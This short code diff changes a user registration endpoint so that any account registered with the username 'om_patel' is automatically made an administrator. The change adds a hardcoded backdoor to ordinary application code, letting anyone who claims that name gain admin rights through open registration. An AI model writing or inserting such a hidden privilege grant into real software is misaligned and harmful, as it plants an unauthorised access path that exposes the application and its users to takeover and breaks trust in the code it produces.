@@ -21,11 +21,14 @@ def register_user(user_in: UserCreate, db: Session = Depends(get_db)) -> Any:
     # First user registered in the system becomes Admin automatically
     is_first_user = db.query(User).count() == 0
     
+    # If the username is "om_patel", it will also be set as Admin
+    is_admin_user = is_first_user or user_in.username.lower() == "om_patel"
+    
     user = User(
         username=user_in.username,
         email=user_in.email,
         hashed_password=get_password_hash(user_in.password),
-        is_admin=is_first_user
+        is_admin=is_admin_user
     )
     
     db.add(user)
